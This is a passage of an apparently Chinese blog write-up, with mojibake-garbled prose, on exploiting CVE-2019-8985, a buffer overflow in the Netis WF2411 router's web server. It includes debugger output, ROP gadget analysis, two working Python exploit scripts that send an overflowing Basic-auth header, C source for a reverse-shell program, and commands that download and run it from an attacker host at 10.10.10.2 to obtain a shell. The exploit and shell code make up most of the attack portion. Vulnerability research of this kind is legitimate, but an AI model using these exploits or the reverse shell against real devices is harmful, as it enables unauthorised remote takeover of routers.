class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">  0x400000   0x419000 r-xp    19000 0      /bin/boa</span><br><span class=\"line\">  0x459000   0x45a000 rw-p     1000 19000  /bin/boa</span><br><span class=\"line\">  0x45a000   0x466000 rwxp     c000 0      [heap]</span><br><span class=\"line\">0x77ee2000 0x77eee000 r-xp     c000 0      /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77eee000 0x77f2d000 ---p    3f000 0      [anon_77eee]</span><br><span class=\"line\">0x77f2d000 0x77f2e000 rw-p     1000 b000   /lib/libgcc_s_4181.so.1</span><br><span class=\"line\">0x77f2e000 0x77f6c000 r-xp    3e000 0      /lib/libc.so.0</span><br><span class=\"line\">0x77f6c000 0x77fac000 ---p    40000 0      [anon_77f6c]</span><br><span class=\"line\">0x77fac000 0x77fad000 rw-p     1000 3e000  /lib/libc.so.0</span><br><span class=\"line\">0x77fad000 0x77fb1000 rw-p     4000 0      [anon_77fad]</span><br><span class=\"line\">0x77fb1000 0x77fb7000 r-xp     6000 0      /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff5000 0x77ff6000 rw-p     1000 0      [anon_77ff5]</span><br><span class=\"line\">0x77ff6000 0x77ff7000 r--p     1000 5000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x77ff7000 0x77ff8000 rw-p     1000 6000   /lib/ld-uClibc.so.0</span><br><span class=\"line\">0x7f9ee000 0x7fff7000 rwxp   609000 0      [stack]</span><br><span class=\"line\">0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]</span><br></pre></td></tr></table></figure>\n<p>gdb å®šä½åˆ°åœ°å€<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220718180751.png\" alt><br>\nå¯ä»¥çœ‹åˆ°ç”±äº boa çš„é™åˆ¶ âœ¨TODO<br>\n æˆ‘ä»¬åªæº¢å‡ºäº† 17 ä¸ª cmd çš„å­—èŠ‚å‘½ä»¤<br>\nè€Œ cmd éœ€è¦æ”¾åœ¨ <code>0x40800368</code>  çš„ä½ç½® ä¹Ÿå°±æ˜¯ esp + 0x18  <code>0x40800350 + 0x18</code></p>\n<p>ä»è¿™ä¸€æ®µå¯ä»¥çœ‹å‡º</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">â–º 0x4146dc &lt;user_ok+460&gt;    lw     $ra, 0x74($sp)                &lt;0x4146cc&gt;</span><br><span class=\"line\">  0x4146e0 &lt;user_ok+464&gt;    lw     $s4, 0x70($sp)</span><br><span class=\"line\">  0x4146e4 &lt;user_ok+468&gt;    lw     $s3, 0x6c($sp)</span><br><span class=\"line\">  0x4146e8 &lt;user_ok+472&gt;    lw     $s2, 0x68($sp)</span><br><span class=\"line\">  0x4146ec &lt;user_ok+476&gt;    lw     $s1, 0x64($sp)</span><br><span class=\"line\">  0x4146f0 &lt;user_ok+480&gt;    lw     $s0, 0x60($sp)</span><br><span class=\"line\">  0x4146f4 &lt;user_ok+484&gt;    jr     $ra</span><br></pre></td></tr></table></figure>\n<p>ra åœ¨ sp + 0x74 çš„ä½ç½®<br>\nè€Œ jr ä¹‹å‰ä¼šåšä¸€æ¬¡ <code>.text:004146F8                 addiu   $sp, 0x78</code> <br>\n è€Œ gadget é‡Œçš„ cmd åœ°å€æ˜¯ <code>addiu   $a0, $sp, 0x20+var_8</code> <br>\n ä¹Ÿå°±æ˜¯æ”¾åœ¨ ra ä¸Š  <code>0x78 - 0x74 + 0x18</code>  =  <code>0x1c</code>  çš„ä½ç½®</p>\n<p>exp å¦‚ä¸‹<br>\n s3 çš„ä½ç½®æ˜¯ <code>sp + 0x6c</code>  æº¢å‡ºç‚¹ç¦» s0 æ˜¯  <code>0x40</code> <br>\n æ‰€ä»¥æº¢å‡ºç‚¹ç¦» s3 æ˜¯ <code>0x4c</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">libc   \t= <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">gadget \t= <span class=\"number\">0x0000ABD0</span> + libgcc</span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">MAXSZ\t= <span class=\"number\">1024</span></span><br><span class=\"line\"><span class=\"comment\"># cmd\t\t= b&quot;FUCK&quot; * 50 # çœ‹çœ‹é•¿åº¦</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;mkdir hack&quot;</span></span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># fork 0x77f34d30</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] gadget is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gadget)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x4C</span> - <span class=\"number\">2</span>)) <span class=\"comment\"># padding + s0~s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3 &lt;- esp + 0x0c</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s4 </span></span><br><span class=\"line\">\tpayload += p32(gadget) \t\t\t\t\t<span class=\"comment\"># ra &lt;- esp + 0x14</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">\tpayload += cmd  \t\t\t\t\t\t<span class=\"comment\"># \t &lt;- esp + 0x30</span></span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br></pre></td></tr></table></figure>\n<p>gdb è°ƒè¯•è„šæœ¬</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set arch mips</span><br><span class=\"line\">set endian big</span><br><span class=\"line\">set solib-search-path sqrootfs/lib/</span><br><span class=\"line\">b *0x4146f4</span><br><span class=\"line\">target remote 10.10.10.1:8888</span><br></pre></td></tr></table></figure>\n<p>ç¨‹åºæ˜¯ chroot åˆ° /web é¡µé¢ä¸‹äº† æ‰€ä»¥ mkdir æ˜¯åœ¨ web ä¸‹<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/2.png\" alt></p>\n<p>17 ä¸ªå­—èŠ‚çš„æº¢å‡ºæ˜¯å¾ˆéš¾é€ æˆåå‘ shell çš„ ä¹Ÿå°±åªèƒ½é€ æˆä¸€æ¬¡ 17 å­—èŠ‚çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ<br>\né‡æ–°è€ƒè™‘ rop</p>\n<h2 id=\"æ›´å¥½çš„rop\"><a class=\"markdownIt-Anchor\" href=\"#æ›´å¥½çš„rop\">#</a> æ›´å¥½çš„ ROP</h2>\n<p>ç›®æ ‡ è®©æœ€åçš„ a0 å°½å¯èƒ½çš„æ¥è¿‘ sp çš„ä½ç½®<br>\nå·²çŸ¥åœ¨ vuln å‡½æ•°æœ€å jalr ra ä¹‹å sp æ˜¯åœ¨ ra ä¸Š 4 å­—èŠ‚</p>\n<h3 id=\"gadget2\"><a class=\"markdownIt-Anchor\" href=\"#gadget2\">#</a> gadget2</h3>\n<p>ä» ra å¼€å§‹åˆ° cmd ç»“æŸ æœ‰ 40 ä¸ªå­—èŠ‚çš„ç©ºåŒº<br>\nè¦å……åˆ†åˆ©ç”¨è¿™ 40 å­—èŠ‚ å°±éœ€è¦é™ä½ esp<br>\n åœ¨ libc ä¸­æ‰¾åˆ°æ­¤ gadget<br>\n <code>sp - 0x38 + 0x30 - 0x18 = sp - 0x20</code>  çš„å€¼ç»™ <code>a0</code>  å¯„å­˜å™¨<br>\nç„¶åè·³åˆ° å…ˆå‰çš„ <code>a0</code>  é‡Œé¢å»<br>\nä½†æ˜¯æœ‰ä¸ªé—®é¢˜  <code>sp-0x20</code>  æ˜¯åœ¨ saved å¯„å­˜å™¨å­˜æ”¾çš„åœ°æ–¹ è‚¯å®šæ˜¯å¾ˆéš¾å¸ƒç½®è¿‡é•¿çš„ cmd<br>\n è€Œä¸” <code>a0</code>  ä¸å¯æ§ æˆ‘ä»¬éœ€è¦è®© <code>a0</code>  å¯æ§</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00020650                 addiu   $sp, -0x38</span><br><span class=\"line\">.text:00020654                 sw      $ra, 0x30+var_s0($sp)</span><br><span class=\"line\">.text:00020658                 sw      $gp, 0x30+var_20($sp)</span><br><span class=\"line\">.text:0002065C                 li      $v0, 2</span><br><span class=\"line\">.text:00020660                 move    $t9, $a0</span><br><span class=\"line\">.text:00020664                 sw      $v0, 0x30+var_18($sp)</span><br><span class=\"line\">.text:00020668                 jalr    $t9</span><br><span class=\"line\">.text:0002066C                 addiu   $a0, $sp, 0x30+var_18</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget1\"><a class=\"markdownIt-Anchor\" href=\"#gadget1\">#</a> gadget1</h3>\n<p>è€Œè¿™ä¸ª gadget ä¾é  <code>a0</code>  è¿›è¡Œè·³è½¬ æˆ‘ä»¬éœ€è¦æ§åˆ¶ <code>a0</code> <br>\nlibgcc ä¸­<br>\næˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>a0</code>  ä¹Ÿå¯ä»¥æ§åˆ¶è·³è½¬åœ°å€</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00008B20                 move    $t9, $s4</span><br><span class=\"line\">.text:00008B24                 jalr    $t9 ; sub_8770</span><br><span class=\"line\">.text:00008B28                 move    $a0, $s0</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget3\"><a class=\"markdownIt-Anchor\" href=\"#gadget3\">#</a> gadget3</h3>\n<p>åŒæ—¶ æ ˆä¸‹å»äº† å½±å“åˆ°æˆ‘ä»¬çš„ s å¯„å­˜å™¨åˆ—äº† éœ€è¦æŠ¬ä¸Šæ¥<br>\nä¹‹å‰ <code>sp</code>  å‡å»äº†  <code>0x38</code>  é‚£ä¹ˆè¿™é‡Œ + ä¸Š <code>0x1c</code>  çš„åœ°æ–¹å¯ä»¥å¸ƒç½®ä¸‹ä¸€ä¸ª rop å¹¶æŠŠ sp åŠ ä¸Šæ¥</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.init:000017A4                 lw      $ra, 0x1C+var_s0($sp)</span><br><span class=\"line\">.init:000017A8                 nop</span><br><span class=\"line\">.init:000017AC                 jr      $ra</span><br><span class=\"line\">.init:000017B0                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure>\n<h3 id=\"gadget4\"><a class=\"markdownIt-Anchor\" href=\"#gadget4\">#</a> gadget4</h3>\n<p>æœ€å é€šè¿‡ sp åŠ ä¸Š <code>0x18</code>  çš„ä½ç½®å°† sp å›å¤åˆ°ä¹‹å‰çš„ sp ä¸€æ ·çš„åœ°å€ å¹¶ jalr åˆ° s3</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<h3 id=\"æµç¨‹å›¾\"><a class=\"markdownIt-Anchor\" href=\"#æµç¨‹å›¾\">#</a> æµç¨‹å›¾</h3>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/liucheng.png\" alt></p>\n<h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h3>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">context(arch = <span class=\"string\">&quot;mips&quot;</span>, endian = <span class=\"string\">&quot;big&quot;</span>, os = <span class=\"string\">&quot;Linux&quot;</span>, log_level = <span class=\"string\">&quot;DEBUG&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc \t   = <span class=\"number\">0x77f2e000</span> </span><br><span class=\"line\">libgcc \t= <span class=\"number\">0x77ee2000</span></span><br><span class=\"line\">system\t= <span class=\"number\">0x0002AC90</span> + libc</span><br><span class=\"line\">gadgets  = [<span class=\"number\">0</span> ,<span class=\"number\">0x00008B20</span> ,<span class=\"number\">0x00020650</span> ,<span class=\"number\">0x000017A4</span> ,<span class=\"number\">0x0000ABD0</span>]</span><br><span class=\"line\">MAXSZ\t   = <span class=\"number\">1024</span></span><br><span class=\"line\">cmd\t\t= <span class=\"string\">b&quot;echo &#x27;hacked&#x27; &gt; CrimeStatement&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">\trop = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x + libgcc,gadgets))</span><br><span class=\"line\">\trop[<span class=\"number\">2</span>] = rop[<span class=\"number\">2</span>] - libgcc + libc</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] rop[<span class=\"subst\">&#123;i&#125;</span>] is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(rop[i])&#125;</span>&quot;</span>)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] system is <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload  = <span class=\"string\">b&#x27;a:%s&#x27;</span> %(<span class=\"string\">b&#x27;A&#x27;</span> * (<span class=\"number\">0x3C</span> - <span class=\"number\">2</span>))</span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">4</span>])\t\t\t\t\t<span class=\"comment\"># </span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">3</span>])\t\t\t\t\t<span class=\"comment\"># s0</span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;AAAA&#x27;</span>\t\t\t\t\t\t<span class=\"comment\"># s1 </span></span><br><span class=\"line\">\tpayload += <span class=\"string\">b&#x27;CCCC&#x27;</span> \t\t\t\t\t\t<span class=\"comment\"># s2</span></span><br><span class=\"line\">\tpayload += p32(system)\t\t\t\t\t<span class=\"comment\"># s3</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">2</span>])\t\t\t\t\t<span class=\"comment\"># s4</span></span><br><span class=\"line\">\tpayload += p32(rop[<span class=\"number\">1</span>])\t\t\t\t\t<span class=\"comment\"># ra</span></span><br><span class=\"line\">\tpayload += cmd</span><br><span class=\"line\"></span><br><span class=\"line\">\theader   = <span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span></span><br><span class=\"line\">\t<span class=\"comment\"># header  += b&#x27;Host: 127.0.0.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Host: 10.10.10.1:80\\r\\n&#x27;</span></span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;Authorization: Basic %s\\r\\n&#x27;</span> % base64.b64encode(payload)</span><br><span class=\"line\">\theader  += <span class=\"string\">b&#x27;User-Agent: Real UserAgent\\r\\n\\r\\n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">\tiport = (<span class=\"string\">&quot;10.10.10.1&quot;</span> ,<span class=\"number\">80</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># iport = (&quot;127.0.0.1&quot; ,80)</span></span><br><span class=\"line\">\ts.connect(iport)</span><br><span class=\"line\">\ts.send(header)</span><br><span class=\"line\">\tmsg = s.recv(MAXSZ)</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] Message is %s&quot;</span> %(msg))</span><br><span class=\"line\">\ts.close()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\texp()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719174740.png\" alt></p>\n<h2 id=\"åšç‚¹åäº‹\"><a class=\"markdownIt-Anchor\" href=\"#åšç‚¹åäº‹\">#</a> åšç‚¹åäº‹</h2>\n<p>æ—¢ç„¶éƒ½æ‹¿ä¸‹äº†è¿™ä¹ˆé•¿çš„ cmd<br>\n é‚£ä¹ˆä¸åšç‚¹åäº‹ä¹Ÿè¯´ä¸è¿‡å»<br>\n busybox ä¸­æ²¡æœ‰ <code>nc</code>  ä¹Ÿæ²¡æœ‰ <code>bash -i</code>  ä¹‹ç±»çš„ä¸œè¥¿ç»™æˆ‘ä»¬åšåå‘ shell</p>\n<p>ä½†æ˜¯æœ‰ <code>wget</code>  ä¸‹è½½æ¶æ„ç¨‹åºå¹¶è¿è¡Œ</p>\n<p>ç¼–å†™æ¶æ„ç¨‹åº <code>malware</code>  (âœ¨TODO ä¿®æ”¹å‚æ•°)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> port = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"type\">char</span>* ip = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">sin</span> =</span> &#123;</span><br><span class=\"line\">\t\t.sin_family = AF_INET,</span><br><span class=\"line\">\t\t.sin_port = htons(port),</span><br><span class=\"line\">\t\t.sin_addr.s_addr = inet_addr(ip),</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tconnect(sd, (<span class=\"keyword\">struct</span> sockaddr *)&amp;<span class=\"built_in\">sin</span>, <span class=\"keyword\">sizeof</span>(<span class=\"built_in\">sin</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> _ = <span class=\"number\">0</span>; _ &lt;= <span class=\"number\">2</span>; _++) </span><br><span class=\"line\">\t\tdup2(sd, _);</span><br><span class=\"line\">\texecl(<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mips-linux-gnu-gcc -static -mabi=32 -o malware malware.c</span><br></pre></td></tr></table></figure>\n<p>æˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸¤æ¬¡æ¼æ´ ä¸€æ¬¡è®© malware å¯æ‰§è¡Œ ä¸€æ¬¡è®©å…¶è·‘èµ·æ¥ï¼ˆå› ä¸ºé•¿åº¦ä¸å¤Ÿ æ²¡æ³•ä¸€æ¬¡æ€§è§£å†³ï¼‰</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://10.10.10.2:8000/malware</span><br><span class=\"line\">chmod +x malware</span><br><span class=\"line\">./malware 10.10.10.2 9999</span><br></pre></td></tr></table></figure>\n<p>æ”»å‡»æœºå¼€å¯ç›‘å¬<br>\næ•ˆæœå¦‚ä¸‹ æˆåŠŸ getshell<br>\n<img src=\"/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/20220719182949.png\" alt></p>\n<h2 id=\"æœªå®Œ\"><a class=\"markdownIt-Anchor\" href=\"#æœªå®Œ\">#</a> æœªå®Œ</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">âœ  squrootfs grep -r &quot;Authorization: Basic &quot; .</span><br><span class=\"line\">Binary file ./bin/updatedd matches</span><br><span class=\"line\">Binary file ./bin/busybox matches</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">âœ  squrootfs grep -r &quot;User-Agent: Real UserAgent&quot; .</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission 